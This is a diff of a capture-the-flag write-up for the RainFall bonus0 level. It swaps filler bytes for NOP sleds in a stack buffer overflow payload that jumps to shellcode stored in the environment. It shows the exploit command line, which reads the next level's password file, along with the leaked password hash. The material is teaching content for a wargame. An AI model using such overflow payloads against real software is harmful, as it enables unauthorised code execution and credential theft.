@@ -111,8 +111,10 @@ Since the bytes of `buf` are written after the bytes of `buf2`, we have to be sl
 
 So we need to write our address 5 bytes before the end of the `buf` buffer. Such as:
 ```
-buf2 = "AAAAAAAAAAAAAAAAAAAA"
-buf = "BBBBBBBBBBBBBB" + Address (4 bytes) + "B"
+buf2 = "\x90" * 20 (20 bytes)
+buf = "\x90" * 14 + Address (4 bytes) + "\x90" (19 bytes)
+
+buf2 + buf + space + buf (only 14 first bytes) 
 20 + 19 + 1 + 14 = 54 bytes
 ```
 
@@ -147,16 +149,16 @@ Alright, let's craft our payload:
 arg1 = padding of 20 bytes
 arg2 = padding of 14 bytes + address of the shellcode in the env + padding of 1 byte
 
-arg1 = A * 20
-arg2 = B * 14 + "\xbf\xff\xf8\x48" + B * 1
+arg1 = "\x90" * 20
+arg2 = "\x90" * 14 + "\xbf\xff\xf8\x48" + "\x90"
 ```
 
 Let's run it:
 ```bash
-bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 14 + "\x10\xf9\xff\xbf" + "B"'; echo 'cat /home/user/bonus1/.pass') | ./bonus0
- -
- -
-AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBH���A BBBBBBBBBBBBBBH���A
+bonus0@RainFall:~$ (python -c 'print "\x90" * 20'; python -c 'print "\x90" * 14 + "\xbf\xff\xf8\x48"[::-1] + "\x90"'; echo 'cat /home/user/bonus1/.pass') | ./bonus0
+ - 
+ - 
+����������������������������������H���� ��������������H����
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 ```
 
